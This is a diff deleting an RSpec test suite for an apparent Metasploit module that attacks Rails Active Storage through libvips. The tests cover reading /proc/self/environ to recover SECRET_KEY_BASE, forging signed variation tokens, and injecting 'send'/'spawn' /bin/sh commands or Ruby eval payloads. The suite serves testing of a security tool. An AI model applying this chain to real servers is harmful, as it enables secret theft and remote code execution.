--- spec/modules/exploits/multi/http/rails_activestorage_vips_rce_spec.rb
@@ -1,1404 +1,0 @@
-# frozen_string_literal: true
-
-require 'spec_helper'
-require 'base64'
-require 'zlib'
-
-# rubocop:disable Metrics/BlockLength
-RSpec.describe 'exploit/multi/http/rails_activestorage_vips_rce' do
-  include_context 'Msf::Simple::Framework#modules loading'
-
-  subject(:exploit) do
-    load_and_create_module(
-      module_type: 'exploit',
-      reference_name: 'multi/http/rails_activestorage_vips_rce'
-    )
-  end
-
-  let(:png_decoder) { exploit.class::PngDecoder }
-  let(:trigger_error) { exploit.class::TriggerError }
-  let(:flow_error) { exploit.class::FlowError }
-  let(:config_error) { exploit.class::ConfigError }
-  let(:data_error) { exploit.class::DataError }
-  let(:read_budget_error) { exploit.class::ReadBudgetError }
-  let(:unreachable_error) { exploit.class::UnreachableError }
-  let(:png_signature) { "\x89PNG\r\n\x1a\n".b }
-  let(:read_layouts) { exploit.class::READ_LAYOUTS }
-  let(:read_layout) { read_layouts.find { |layout| layout[:dimension] == 20 } }
-
-  def png_chunk(type, data)
-    [data.bytesize].pack('N') + type + data + [Zlib.crc32(type + data)].pack('N')
-  end
-
-  def grayscale_png(width:, height:, scanlines: ''.b, idat: nil, **properties)
-    properties = {
-      bit_depth: 8,
-      color_type: 0,
-      compression: 0,
-      filter: 0,
-      interlace: 0
-    }.merge(properties)
-    ihdr = [width, height, *properties.values_at(:bit_depth, :color_type, :compression, :filter, :interlace)].pack('NNC5')
-    compressed = idat.nil? ? Zlib::Deflate.deflate(scanlines) : idat
-
-    png_signature + png_chunk('IHDR'.b, ihdr) + png_chunk('IDAT'.b, compressed) + png_chunk('IEND'.b, ''.b)
-  end
-
-  def http_response(code, location: nil, body: nil)
-    response = Rex::Proto::Http::Response.new(code)
-    response.headers['Location'] = location if location
-    response.body = body if body
-    response
-  end
-
-  def striped_pixels(layout, source)
-    dimension = layout.fetch(:dimension)
-    columns = (1...(dimension - 1)).step(2).first(layout.fetch(:data_columns))
-    pixels = "\x00".b * (dimension * dimension)
-
-    columns.each_with_index do |column, column_index|
-      dimension.times do |row|
-        pixels.setbyte((row * dimension) + column, source.getbyte((column_index * dimension) + row))
-      end
-    end
-
-    pixels
-  end
-
-  describe 'PngDecoder.decode' do
-    it 'decodes all grayscale PNG scanline filters' do
-      cases = {
-        none: {
-          width: 3,
-          height: 1,
-          scanlines: [0, 10, 20, 30].pack('C*'),
-          expected: [10, 20, 30].pack('C*')
-        },
-        sub: {
-          width: 3,
-          height: 1,
-          scanlines: [1, 10, 10, 10].pack('C*'),
-          expected: [10, 20, 30].pack('C*')
-        },
-        up: {
-          width: 3,
-          height: 2,
-          scanlines: [0, 10, 20, 30, 2, 5, 5, 5].pack('C*'),
-          expected: [10, 20, 30, 15, 25, 35].pack('C*')
-        },
-        average: {
-          width: 3,
-          height: 2,
-          scanlines: [0, 10, 20, 30, 3, 10, 8, 8].pack('C*'),
-          expected: [10, 20, 30, 15, 25, 35].pack('C*')
-        },
-        paeth: {
-          width: 3,
-          height: 2,
-          scanlines: [0, 10, 100, 150, 4, 90, 206, 236].pack('C*'),
-          expected: [10, 100, 150, 100, 50, 80].pack('C*')
-        }
-      }
-
-      cases.each do |name, test_case|
-        png = grayscale_png(
-          width: test_case[:width],
-          height: test_case[:height],
-          scanlines: test_case[:scanlines]
-        )
-
-        expect(png_decoder.decode(png)).to eq(
-          {
-            width: test_case[:width],
-            height: test_case[:height],
-            channels: 1,
-            pixels: test_case[:expected]
-          }
-        ), "failed to decode the #{name} filter"
-      end
-    end
-
-    it 'rejects data without the PNG signature' do
-      expect { png_decoder.decode('not a png'.b) }.to raise_error(trigger_error, /not a PNG/i)
-    end
-
-    it 'rejects truncated chunks and IHDR data' do
-      truncated_chunk = png_signature + [13].pack('N') + 'IHDR'.b + ("\x00".b * 9)
-      short_ihdr = png_signature + png_chunk('IHDR'.b, "\x00".b * 5) + png_chunk('IEND'.b, ''.b)
-
-      expect { png_decoder.decode(truncated_chunk) }.to raise_error(trigger_error)
-      expect { png_decoder.decode(short_ihdr) }.to raise_error(trigger_error)
-    end
-
-    it 'rejects unsupported grayscale image properties' do
-      unsupported_properties = [
-        { bit_depth: 16 },
-        { color_type: 2 },
-        { compression: 1 },
-        { filter: 1 },
-        { interlace: 1 }
-      ]
-
-      unsupported_properties.each do |properties|
-        png = grayscale_png(width: 1, height: 1, scanlines: "\x00\x41".b, **properties)
-        expect { png_decoder.decode(png) }.to raise_error(trigger_error)
-      end
-    end
-
-    it 'rejects an unsupported scanline filter' do
-      png = grayscale_png(width: 1, height: 1, scanlines: "\x05\x41".b)
-
-      expect { png_decoder.decode(png) }.to raise_error(trigger_error, /scanline filter/i)
-    end
-
-    it 'normalizes corrupt and truncated zlib streams to TriggerError' do
-      corrupt = grayscale_png(width: 1, height: 1, idat: 'not zlib'.b)
-      truncated = grayscale_png(width: 1, height: 1, idat: "\x78\x9c".b)
-
-      expect { png_decoder.decode(corrupt) }.to raise_error(trigger_error, /decompression/i)
-      expect { png_decoder.decode(truncated) }.to raise_error(trigger_error, /(decompression|zlib)/i)
-    end
-
-    it 'rejects truncated inflated scanline data' do
-      png = grayscale_png(width: 3, height: 1, scanlines: "\x00\x41".b)
-
-      expect { png_decoder.decode(png) }.to raise_error(trigger_error, /scanline data/i)
-    end
-
-    it 'bounds decompression and rejects trailing compressed data' do
-      bomb = grayscale_png(width: 1, height: 1, idat: Zlib::Deflate.deflate('A' * 4_194_304))
-      trailing = grayscale_png(width: 1, height: 1, idat: Zlib::Deflate.deflate("\x00\x41".b) + 'junk')
-
-      expect { png_decoder.decode(bomb) }.to raise_error(trigger_error, /exceeded/i)
-      expect { png_decoder.decode(trailing) }.to raise_error(trigger_error, /trailing/i)
-    end
-
-    it 'bounds the encoded body, chunk count, and aggregate IDAT data' do
-      oversized_body = png_signature + ("\x00".b * (png_decoder::MAX_DATA_BYTES - png_signature.bytesize + 1))
-      ihdr = [1, 1, 8, 0, 0, 0, 0].pack('NNC5')
-      excessive_chunks = png_signature + png_chunk('IHDR'.b, ihdr) + (png_chunk('tEXt'.b, ''.b) * png_decoder::MAX_CHUNKS)
-      excessive_idat = png_signature + png_chunk('IHDR'.b, ihdr) + png_chunk('IDAT'.b, 'A'.b * (png_decoder::MAX_IDAT_BYTES + 1))
-
-      expect { png_decoder.decode(oversized_body) }.to raise_error(trigger_error, /encoded size/i)
-      expect { png_decoder.decode(excessive_chunks) }.to raise_error(trigger_error, /too many chunks/i)
-      expect { png_decoder.decode(excessive_idat) }.to raise_error(trigger_error, /compressed size/i)
-    end
-  end
-
-  describe '#report_active_storage_service' do
-    before do
-      exploit.datastore['RHOST'] = '192.0.2.10'
-      exploit.datastore['RPORT'] = 8080
-      exploit.datastore['TARGETURI'] = '/application'
-    end
-
-    it 'reports and memoizes the Rails application above HTTP and TCP' do
-      service = double('Rails service')
-      common = { host: '192.0.2.10', port: 8080, proto: 'tcp' }
-      expect(exploit).to receive(:report_service).once.with(
-        common.merge(
-          name: 'rails',
-          info: 'Ruby on Rails Active Storage',
-          resource: { uri: '/application' },
-          parents: common.merge(name: 'http', parents: common.merge(name: 'tcp', parents: nil))
-        )
-      ).and_return(service)
-
-      expect(exploit.send(:report_active_storage_service)).to be(service)
-      expect(exploit.send(:report_active_storage_service)).to be(service)
-    end
-
-    it 'reports HTTPS above SSL and TCP' do
-      exploit.datastore['SSL'] = true
-      service = double('Rails TLS service')
-      common = { host: '192.0.2.10', port: 8080, proto: 'tcp' }
-      expect(exploit).to receive(:report_service).with(
-        common.merge(
-          name: 'rails',
-          info: 'Ruby on Rails Active Storage',
-          resource: { uri: '/application' },
-          parents: common.merge(
-            name: 'https',
-            parents: common.merge(name: 'ssl', parents: common.merge(name: 'tcp', parents: nil))
-          )
-        )
-      ).and_return(service)
-
-      expect(exploit.send(:report_active_storage_service)).to be(service)
-    end
-  end
-
-  describe '#report_vuln' do
-    it 'links framework-generated vulnerability reports to the Rails service' do
-      service = double('Rails service')
-      vulnerability = double('Vulnerability', id: 7)
-      framework_db = exploit.framework.db
-      allow(exploit).to receive(:report_active_storage_service).and_return(service)
-      allow(exploit).to receive(:db).and_return(true)
-      allow(exploit).to receive(:myworkspace).and_return(:test_workspace)
-      allow(exploit).to receive(:mytask).and_return(nil)
-      expect(framework_db).to receive(:report_vuln).with(
-        hash_including(
-          host: '192.0.2.10',
-          name: exploit.fullname,
-          service: service
-        )
-      ).and_return(vulnerability)
-      allow(framework_db).to receive(:report_vuln_attempt)
-
-      result = exploit.report_vuln(host: '192.0.2.10', name: exploit.fullname)
-
-      expect(result).to be(vulnerability)
-      expect(exploit.instance_variable_get(:@vulnerability_reported)).to be(true)
-    end
-  end
-
-  describe '#service_details' do
-    it 'associates inferred session vulnerabilities with the Rails service' do
-      exploit.datastore['RHOST'] = '192.0.2.10'
-      exploit.datastore['RPORT'] = 8080
-
-      expect(exploit.service_details).to eq(
-        origin_type: :service,
-        protocol: 'tcp',
-        service_name: 'rails',
-        address: '192.0.2.10',
-        port: 8080
-      )
-    end
-  end
-
-  describe 'target defaults' do
-    it 'removes the Linux fetch artifact after execution' do
-      expect(exploit.targets.fetch(1).default_options.fetch('FETCH_DELETE')).to be(true)
-    end
-  end
-
-  describe '#check' do
-    it 'returns a linked Vulnerable result without directly reporting the vulnerability' do
-      service = double('Rails service')
-      context = { layout: read_layout, mode: :raw }
-      allow(exploit).to receive(:detect_read_context).and_return(context)
-      allow(exploit).to receive(:report_active_storage_service).and_return(service)
-      expect(exploit).not_to receive(:report_vuln)
-
-      result = exploit.check
-
-      expect(result.code).to eq('vulnerable')
-      expect(result.reason).to include("#{read_layout.fetch(:dimension)}x#{read_layout.fetch(:dimension)} raw layout")
-      expect(result.vuln).to eq(
-        service: service,
-        info: 'Confirmed arbitrary file read through an Active Storage representation'
-      )
-    end
-
-    it 'returns Unknown for invalid local configuration' do
-      exploit.datastore['REPRESENTATION_INDEX'] = -1
-
-      result = exploit.check
-
-      expect(result.code).to eq('unknown')
-      expect(result.reason).to eq('REPRESENTATION_INDEX must be non-negative')
-    end
-
-    it 'returns Detected when the supplied secret validates without testing the file read' do
-      secret = 'known-secret'
-      context = { secret_key_base: secret }
-      service = double('Rails service')
-      exploit.datastore['SECRET_KEY_BASE'] = secret
-      allow(exploit).to receive(:context_from_known_secret).with(secret).and_return(context)
-      allow(exploit).to receive(:verify_known_secret_context).with(context)
-      allow(exploit).to receive(:report_active_storage_service).and_return(service)
-
-      result = exploit.check
-
-      expect(result.code).to eq('detected')
-      expect(result.reason).to include('arbitrary file read was not tested')
-    end
-
-    it 'normalizes an unexpected remote failure to Unknown' do
-      allow(exploit).to receive(:detect_read_context).and_raise(trigger_error, 'unexpected target response')
-
-      result = exploit.check
-
-      expect(result.code).to eq('unknown')
-      expect(result.reason).to eq('unexpected target response')
-    end
-
-    it 'does not conceal programming errors as an Unknown result' do
-      allow(exploit).to receive(:detect_read_context).and_raise(NoMethodError, 'programming defect')
-
-      expect { exploit.check }.to raise_error(NoMethodError, /programming defect/)
-    end
-
-    it 'returns Unknown when local exploit data is unavailable' do
-      allow(exploit).to receive(:detect_read_context).and_raise(data_error, 'missing exploit data')
-
-      result = exploit.check
-
-      expect(result.code).to eq('unknown')
-      expect(result.reason).to eq('missing exploit data')
-    end
-  end
-
-  describe '#exploit' do
-    let(:execution_context) do
-      {
-        verifier_key: 'key',
-        verifier_digest: 'sha1',
-        message_serializer: :json,
-        verifier_source: 'a test verifier key'
-      }
-    end
-
-    before do
-      allow(exploit).to receive(:variation_transformations).and_return('send' => ['spawn'])
-      allow(exploit).to receive(:forged_representation_path).and_return('/forged')
-      allow(exploit).to receive(:trigger_variation)
-    end
-
-    it 'reports the confirmed file-read vulnerability when AutoCheck state is absent' do
-      service = double('Rails service')
-      context = { layout: read_layout, mode: :raw }
-      allow(exploit).to receive(:detect_read_context).and_return(context)
-      allow(exploit).to receive(:context_from_recovered_secret).with(context).and_return(execution_context)
-      allow(exploit).to receive(:report_active_storage_service).and_return(service)
-      expect(exploit).to receive(:report_vuln).with(
-        host: exploit.rhost,
-        port: exploit.rport,
-        proto: 'tcp',
-        service: service,
-        name: exploit.fullname,
-        info: 'Confirmed arbitrary file read through an Active Storage representation',
-        refs: exploit.references
-      )
-
-      exploit.method(:exploit).super_method.call
-    end
-
-    it 'reports only the application service in known-secret mode' do
-      secret = 'known-secret'
-      exploit.datastore['SECRET_KEY_BASE'] = secret
-      allow(exploit).to receive(:context_from_known_secret).with(secret).and_return(execution_context)
-      allow(exploit).to receive(:verify_known_secret_context).with(execution_context)
-      expect(exploit).to receive(:report_active_storage_service).and_return(double('Rails service'))
-      expect(exploit).not_to receive(:report_vuln)
-
-      exploit.method(:exploit).super_method.call
-    end
-
-    it 'maps transport failures to Failure::Unreachable' do
-      allow(exploit).to receive(:validate_options!).and_raise(unreachable_error, 'target did not respond')
-      expect(exploit).to receive(:fail_with)
-        .with(Msf::Module::Failure::Unreachable, 'target did not respond')
-        .and_throw(:mapped_failure)
-
-      expect { exploit.method(:exploit).super_method.call }.to throw_symbol(:mapped_failure)
-    end
-  end
-
-  describe '#restore_ascii_pixels' do
-    let(:source) do
-      Array.new(read_layout.fetch(:capacity)) { |index| 32 + (index % 95) }.pack('C*')
-    end
-    let(:raw_read) do
-      {
-        width: read_layout.fetch(:dimension),
-        height: read_layout.fetch(:dimension),
-        pixels: striped_pixels(read_layout, source)
-      }
-    end
-    let(:sharpened_read) do
-      # Captured from image_processing 1.14.0 and libvips 8.14.1 applying
-      # ImageProcessing::Vips::Processor::SHARPEN_MASK to raw_read.
-      pixels = Base64.strict_decode64(
-        'ACgAQQBaAHMAjAAuAEcAYAB5AAAAKQBCAFsAdACNADAASQBiAHsAAAArAEQAXQB2AI8AMQBKAGMAfAAAACwARQBeAHcAkAAy' \
-        'AEsAZAB9AAAALQBGAF8AeACRADMATABlAH4AAAAuAEcAYAB5AJIANQBOAGcAgAAAADAASQBiAHsAlAA2AE8AaACBAAAAMQBK' \
-        'AGMAfACVADcAUABpAIIAAAAyAEsAZAB9AJYAOABRAGoAgwAAADMATABlAH4AlwA6AFMAbACFAAAANQBOAGcAgACZADsAVABt' \
-        'AIYAAAA2AE8AaACBAJoAPABVAG4AhwAAADcAUABpAIIAmwA9AFYAbwCIAAAAOABRAGoAgwCcAD8AWABxAIoAAAA6AFMAbACF' \
-        'AKEAQABZAHIAiwAAADsAVABtAIYAJABBAFoAcwCMAAAAPABVAG4AhwApAEIAWwB0AI0AAAA9AFYAbwCIACsARABdAHYAjwAA' \
-        'AD8AWABxAIoALABFAF4AdwCQAAAAQABZAHIAiwAtAEYAXwB4AJEAAA=='
-      )
-      {
-        width: read_layout.fetch(:dimension),
-        height: read_layout.fetch(:dimension),
-        pixels: pixels
-      }
-    end
-
-    it 'restores raw striped bytes in source-file order' do
-      expect(exploit.send(:restore_ascii_pixels, raw_read, read_layout, :raw)).to eq(source)
-    end
-
-    it 'inverts the Vips sharpen convolution and restores exact bytes' do
-      expect(exploit.send(:restore_ascii_pixels, sharpened_read, read_layout, :sharpened)).to eq(source)
-    end
-
-    it 'rejects unexpected image geometry and truncated pixel data' do
-      wrong_geometry = raw_read.merge(width: read_layout.fetch(:dimension) - 1)
-      truncated = raw_read.merge(pixels: raw_read.fetch(:pixels).byteslice(0...-1))
-
-      expect { exploit.send(:restore_ascii_pixels, wrong_geometry, read_layout, :raw) }.to raise_error(trigger_error)
-      expect { exploit.send(:restore_ascii_pixels, truncated, read_layout, :raw) }.to raise_error(trigger_error)
-    end
-
-    it 'partially recovers a NUL-delimited ASCII secret after saturated bytes' do
-      prefix = "JUNK=\xff\xfe\xfd\x00SECRET_KEY_BASE=partial-safe-secret\x00".b
-      source = prefix.ljust(read_layout.fetch(:capacity), "\x00")
-      pixels = striped_pixels(read_layout, source)
-      dimension = read_layout.fetch(:dimension)
-
-      (1...(dimension - 1)).step(2) do |column|
-        observed = dimension.times.map { |row| pixels.getbyte((row * dimension) + column) }
-        sharpened = exploit.send(:sharpened_column, observed)
-        sharpened.each_with_index { |value, row| pixels.setbyte((row * dimension) + column, value) }
-      end
-
-      read = { width: dimension, height: dimension, pixels: pixels }
-      recovered = exploit.send(:restore_ascii_pixels_partial, read, read_layout)
-
-      expect(recovered).to include("SECRET_KEY_BASE=partial-safe-secret\x00".b)
-      expect(recovered).not_to include("JUNK=\xff".b)
-    end
-  end
-
-  describe '#read_text_file' do
-    it 'does not return data beyond max_bytes when the final read exceeds the boundary' do
-      capacity = read_layout.fetch(:capacity)
-      context = { layout: read_layout, mode: :raw }
-      first_read = { offset: 0 }
-      second_read = { offset: capacity }
-      observed_sizes = []
-
-      expect(exploit).to receive(:file_read_once).ordered.with(read_layout, '/proc/version', 0, 'read.h5').and_return(first_read)
-      expect(exploit).to receive(:restore_ascii_pixels).ordered.with(first_read, read_layout, :raw).and_return('A'.b * capacity)
-      expect(exploit).to receive(:file_read_once).ordered.with(read_layout, '/proc/version', capacity, 'read.h5').and_return(second_read)
-      expect(exploit).to receive(:restore_ascii_pixels).ordered.with(second_read, read_layout, :raw).and_return('B'.b * capacity)
-
-      recovered = exploit.send(
-        :read_text_file,
-        context,
-        '/proc/version',
-        max_bytes: capacity + 1,
-        filename: 'read.h5',
-        stop_when: lambda { |bytes|
-          observed_sizes << bytes.bytesize
-          false
-        }
-      )
-
-      expect(recovered).to eq(('A'.b * capacity) + 'B'.b)
-      expect(recovered.bytesize).to eq(capacity + 1)
-      expect(observed_sizes).to eq([capacity, capacity + 1])
-    end
-  end
-
-  describe 'the crafted read request budget' do
-    it 'allows the configured number of reads, rejects the next one, and can be reset for a new phase' do
-      exploit.datastore['MaxReadRequests'] = 2
-      exploit.send(:reset_read_budget!)
-
-      expect { exploit.send(:reserve_read_request!) }.not_to raise_error
-      expect { exploit.send(:reserve_read_request!) }.not_to raise_error
-      expect { exploit.send(:reserve_read_request!) }.to raise_error(read_budget_error, /MaxReadRequests/)
-
-      exploit.send(:reset_read_budget!)
-      expect { exploit.send(:reserve_read_request!) }.not_to raise_error
-    end
-  end
-
-  describe '#patch_hdf5_template' do
-    let(:external_path) { '/proc/self/environ' }
-    let(:external_offset) { 4096 }
-    let(:placeholder) { '/rails_vips_external_path_placeholder_012345678901234567890123456789'.b }
-    let(:marker_base) { 0x4d53460000000000 }
-    let(:artifact_path) do
-      ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2026-66066', read_layout.fetch(:artifact))
-    end
-
-    it 'matches every committed artifact to its read layout' do
-      read_layouts.each do |layout|
-        path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2026-66066', layout.fetch(:artifact))
-        expect(::File.file?(path)).to be(true)
-
-        data = ::File.binread(path)
-        dimension = layout.fetch(:dimension)
-        data_columns = layout.fetch(:data_columns)
-        marker_counts = data_columns.times.map do |index|
-          record = [marker_base + index, dimension].pack('Q<2')
-          data.scan(record).length
-        end
-
-        expect(layout.fetch(:capacity)).to eq(dimension * data_columns)
-        expect(data.scan(placeholder).length).to eq(data_columns)
-        expect(marker_counts).to all(eq(1))
-      end
-    end
-
-    it 'patches each external path and marker using the layout stride' do
-      expect(::File.file?(artifact_path)).to be(true)
-
-      original = ::File.binread(artifact_path)
-      patched = exploit.send(:patch_hdf5_template, read_layout, external_path, external_offset)
-      replacement = external_path.b.ljust(placeholder.bytesize, "\x00")
-
-      expect(patched.bytesize).to eq(original.bytesize)
-      expect(original.scan(placeholder).length).to eq(read_layout.fetch(:data_columns))
-      expect(patched.scan(replacement).length).to eq(read_layout.fetch(:data_columns))
-
-      read_layout.fetch(:data_columns).times do |index|
-        marker = [marker_base + index].pack('Q<')
-        expect(original.scan(marker).length).to eq(1)
-
-        marker_position = original.index(marker)
-        expect(marker_position).not_to be_nil
-        expect(patched.byteslice(marker_position, 8).unpack1('Q<')).to eq(external_offset + (index * read_layout.fetch(:dimension)))
-        expect(patched.byteslice(marker_position + 8, 8).unpack1('Q<')).to eq(read_layout.fetch(:dimension))
-      end
-
-      expect(::File.binread(artifact_path)).to eq(original)
-    end
-
-    it 'rejects an artifact that does not match its layout' do
-      smaller_layout = read_layouts.find { |layout| layout[:dimension] == 16 }
-      invalid_layout = read_layout.merge(artifact: smaller_layout.fetch(:artifact))
-
-      expect { exploit.send(:patch_hdf5_template, invalid_layout, external_path, external_offset) }.to raise_error(data_error)
-    end
-
-    it 'rejects invalid external paths and offsets' do
-      oversized_path = 'A' * (placeholder.bytesize + 1)
-
-      expect { exploit.send(:patch_hdf5_template, read_layout, "/bad\x00path", external_offset) }.to raise_error(flow_error, /NUL/)
-      expect { exploit.send(:patch_hdf5_template, read_layout, oversized_path, external_offset) }.to raise_error(flow_error)
-      expect { exploit.send(:patch_hdf5_template, read_layout, external_path, -1) }.to raise_error(flow_error)
-    end
-  end
-
-  describe '#derive_verifier_key' do
-    let(:secret_key_base) { 'test-secret-key-base' }
-
-    it 'matches the Rails SHA1 key generator vector' do
-      expected = [
-        '5d7610692c916ec0b162d2c625aa48876a18b06667ff64b1660ce978d1e811fe' \
-        '03831e2149f89eaf9a2d6be105f6736452a0f2022fc12abd770063eb8c045fb7'
-      ].pack('H*')
-
-      expect(exploit.send(:derive_verifier_key, secret_key_base, 'sha1')).to eq(expected)
-    end
-
-    it 'matches the Rails SHA256 key generator vector' do
-      expected = [
-        '4c3df32bc45761c03c0260f7285d2122c71aa36f4c6c67859443c3bab954c417' \
-        '70361c4d6eff8195a953a251c88effa2edb53bde3411d5ba13125cce6152606c'
-      ].pack('H*')
-
-      expect(exploit.send(:derive_verifier_key, secret_key_base, 'sha256')).to eq(expected)
-    end
-  end
-
-  describe '#forged_variation' do
-    let(:transformations) { exploit.send(:command_transformations, 'id') }
-    let(:verifier_key) { exploit.send(:derive_verifier_key, 'test-secret-key-base', 'sha256') }
-
-    it 'uses a legacy JSON metadata envelope and standard padded Base64' do
-      serialized = exploit.send(:variation_payload, transformations, :json)
-      token = exploit.send(:forged_variation, verifier_key, serialized, 'sha1')
-      encoded, _separator, signature = token.rpartition('--')
-
-      expect(encoded).to eq(Base64.strict_encode64(serialized))
-      expect(signature).to eq(OpenSSL::HMAC.hexdigest('SHA1', verifier_key, encoded))
-
-      envelope = JSON.parse(Base64.strict_decode64(encoded))
-      inner = Base64.strict_decode64(envelope.fetch('_rails').fetch('message'))
-      expect(JSON.parse(inner)).to eq(transformations)
-    end
-
-    it 'serializes the same native transformations as a plain Marshal hash for legacy Rails defaults' do
-      serialized = exploit.send(:variation_payload, transformations, :marshal)
-      envelope = JSON.parse(serialized)
-      inner = Base64.strict_decode64(envelope.fetch('_rails').fetch('message'))
-
-      expect(inner).to eq(Marshal.dump(transformations))
-      expect(inner).to start_with("\x04\x08".b)
-    end
-
-    it 'infers JSON, Marshal, MessagePack fallback, and verifier settings from signed blob IDs' do
-      modern_json = { _rails: { data: 47, pur: 'blob_id' } }.to_json
-      modern_encoded = Base64.urlsafe_encode64(modern_json, padding: false)
-      modern_token = "#{modern_encoded}--#{'a' * 64}"
-
-      marshaled_blob_id = Marshal.dump(47)
-      legacy_marshal = {
-        _rails: {
-          message: Base64.strict_encode64(marshaled_blob_id),
-          exp: nil,
-          pur: 'blob_id'
-        }
-      }.to_json
-      legacy_token = "#{Base64.strict_encode64(legacy_marshal)}--#{'b' * 40}"
-      message_pack_token = "#{Base64.strict_encode64("\xcc\x80\x01".b)}--#{'c' * 96}"
-
-      modern_info = exploit.send(:signed_token_info, modern_token)
-      legacy_info = exploit.send(:signed_token_info, legacy_token)
-      message_pack_info = exploit.send(:signed_token_info, message_pack_token)
-
-      expect(modern_info.values_at(:message_serializer, :verifier_digest)).to eq([:json, 'sha256'])
-      expect(legacy_info.values_at(:message_serializer, :verifier_digest)).to eq([:marshal, 'sha1'])
-      expect(message_pack_info.values_at(:message_serializer, :verifier_digest)).to eq([:json, 'sha384'])
-    end
-
-    it 'uses the send/spawn operation supported throughout image_processing 1.x' do
-      expect(transformations).to eq('send' => ['spawn', '/bin/sh', '-c', 'id'])
-    end
-
-    it 'uses the send/eval operation for the native Ruby target' do
-      expect(exploit.send(:ruby_transformations, 'RUBY_PAYLOAD')).to eq('send' => ['eval', 'RUBY_PAYLOAD'])
-    end
-
-    it 'validates every supported key-generator digest against a signed token' do
-      encoded = Base64.strict_encode64({ _rails: { data: 47, pur: 'blob_id' } }.to_json)
-
-      exploit.class::KEY_GENERATOR_DIGESTS.each do |digest|
-        verifier_key = exploit.send(:derive_verifier_key, 'test-secret-key-base', digest)
-        signature = OpenSSL::HMAC.hexdigest('SHA1', verifier_key, encoded)
-        info = exploit.send(:signed_token_info, "#{encoded}--#{signature}")
-
-        expect(exploit.send(:key_generator_digest_for, 'test-secret-key-base', info)).to eq(digest)
-      end
-    end
-  end
-
-  describe '#parse_environment' do
-    it 'parses NUL-delimited entries and preserves values containing equals signs' do
-      pixels = "SECRET_KEY_BASE=alpha=beta\x00EMPTY=\x00MALFORMED\x00DUPLICATE=first\x00DUPLICATE=last\x00".b
-
-      expect(exploit.send(:parse_environment, pixels)).to eq(
-        {
-          'SECRET_KEY_BASE' => 'alpha=beta',
-          'EMPTY' => '',
-          'DUPLICATE' => 'last'
-        }
-      )
-    end
-
-    it 'does not treat a key name embedded in another value as a complete entry' do
-      embedded = "OTHER=prefixSECRET_KEY_BASE=wrong\x00".b
-      anchored = embedded + "SECRET_KEY_BASE=right\x00".b
-
-      expect(exploit.send(:environment_contains_complete_key?, embedded)).to be(false)
-      expect(exploit.send(:environment_contains_complete_key?, anchored)).to be(true)
-    end
-
-    it 'does not stop at a master key before later environment entries are read' do
-      bytes = "RAILS_MASTER_KEY=#{'a' * 32}\x00RAILS_ENV=custom\x00".b
-
-      expect(exploit.send(:environment_contains_usable_key?, bytes, '/proc/self/environ', 'signed-id')).to be(false)
-    end
-
-    it 'stops only after SECRET_KEY_BASE validates against the signed blob ID' do
-      bytes = "SECRET_KEY_BASE=validated-secret\x00".b
-      validated = ['validated-secret', '/proc/self/environ', 'sha256', { encoded: 'token' }]
-      yielded = nil
-      allow(exploit).to receive(:validated_secret_candidate).and_return(validated)
-
-      result = exploit.send(:environment_contains_usable_key?, bytes, '/proc/self/environ', 'signed-id') do |candidate|
-        yielded = candidate
-      end
-
-      expect(result).to be(true)
-      expect(yielded).to eq(validated)
-    end
-  end
-
-  describe '#recover_secret_key_base' do
-    it 'links recovered environment loot to the Rails service' do
-      exploit.datastore['RHOST'] = '192.0.2.10'
-      service = double('Rails service')
-      bytes = "SECRET_KEY_BASE=validated-secret\x00".b
-      token_info = { encoded: 'token' }
-      validated = ['validated-secret', '/proc/self/environ', 'sha256', token_info]
-      context = {
-        mode: :raw,
-        representation: { signed_id: 'signed-id' }
-      }
-      allow(exploit).to receive(:try_read_text_file) do |_read_context, path, **_options|
-        path == '/proc/self/environ' ? bytes : nil
-      end
-      allow(exploit).to receive(:validated_secret_candidate)
-        .with('validated-secret', '/proc/self/environ', 'signed-id')
-        .and_return(validated)
-      allow(exploit).to receive(:report_active_storage_service).and_return(service)
-      expect(exploit).to receive(:store_loot).with(
-        'rails.process.environ',
-        'application/octet-stream',
-        exploit.rhost,
-        bytes,
-        'environ.bin',
-        'Recovered /proc/self/environ bytes',
-        service
-      ).and_return('/tmp/rails-process-environ.bin')
-
-      expect(exploit.send(:recover_secret_key_base, context)).to eq(validated)
-    end
-  end
-
-  describe '#representation_paths' do
-    it 'extracts modern and legacy representation URLs from src and srcset attributes' do
-      doc = Nokogiri::HTML(<<~HTML)
-        <img src="/assets/avatar.png"
-             srcset="/assets/avatar-small.png 1x, /rails/active_storage/representations/redirect/blob/variation/avatar.png 2x">
-        <img src="/rails/active_storage/representations/proxy/blob/variation/photo.png"
-             srcset="/rails/active_storage/representations/proxy/blob/variation/photo.png 1x, /assets/photo-large.png 2x">
-        <img src="/rails/active_storage/representations/blob/variation/legacy.png">
-      HTML
-
-      expect(exploit.send(:representation_paths, doc)).to eq(
-        [
-          '/rails/active_storage/representations/proxy/blob/variation/photo.png',
-          '/rails/active_storage/representations/blob/variation/legacy.png',
-          '/rails/active_storage/representations/redirect/blob/variation/avatar.png'
-        ]
-      )
-    end
-
-    it 'substitutes signed IDs and variations in modern and legacy routes' do
-      modern = '/rails/active_storage/representations/redirect/old_blob/old_variation/image.png'
-      legacy = '/rails/active_storage/representations/old_blob/old_variation/image.png'
-
-      expect(exploit.send(:substitute_representation_blob, modern, 'new_blob', 'new.png')).to eq(
-        '/rails/active_storage/representations/redirect/new_blob/old_variation/new.png'
-      )
-      expect(exploit.send(:substitute_variation_key, legacy, 'new_variation')).to eq(
-        '/rails/active_storage/representations/old_blob/new_variation/image.png'
-      )
-    end
-
-    it 'uses the Active Storage route when the application base path also contains representations' do
-      path = '/representations/application/rails/active_storage/representations/redirect/old_blob/old_variation/image.png'
-
-      expect(exploit.send(:substitute_representation_blob, path, 'new_blob', 'new.png')).to eq(
-        '/representations/application/rails/active_storage/representations/redirect/new_blob/old_variation/new.png'
-      )
-    end
-
-    it 'uses the Active Storage route when the representation filename is representations' do
-      path = '/rails/active_storage/representations/redirect/old_blob/old_variation/representations'
-
-      expect(exploit.send(:substitute_variation_key, path, 'new_variation')).to eq(
-        '/rails/active_storage/representations/redirect/old_blob/new_variation/representations'
-      )
-    end
-
-    it 'constructs both standard representation route layouts' do
-      expect(exploit.send(:standard_representation_path, 'blob', 'variation', 'safe.png')).to eq(
-        '/rails/active_storage/representations/redirect/blob/variation/safe.png'
-      )
-      expect(exploit.send(:standard_representation_path, 'blob', 'variation', 'safe.png', route: :legacy)).to eq(
-        '/rails/active_storage/representations/blob/variation/safe.png'
-      )
-    end
-  end
-
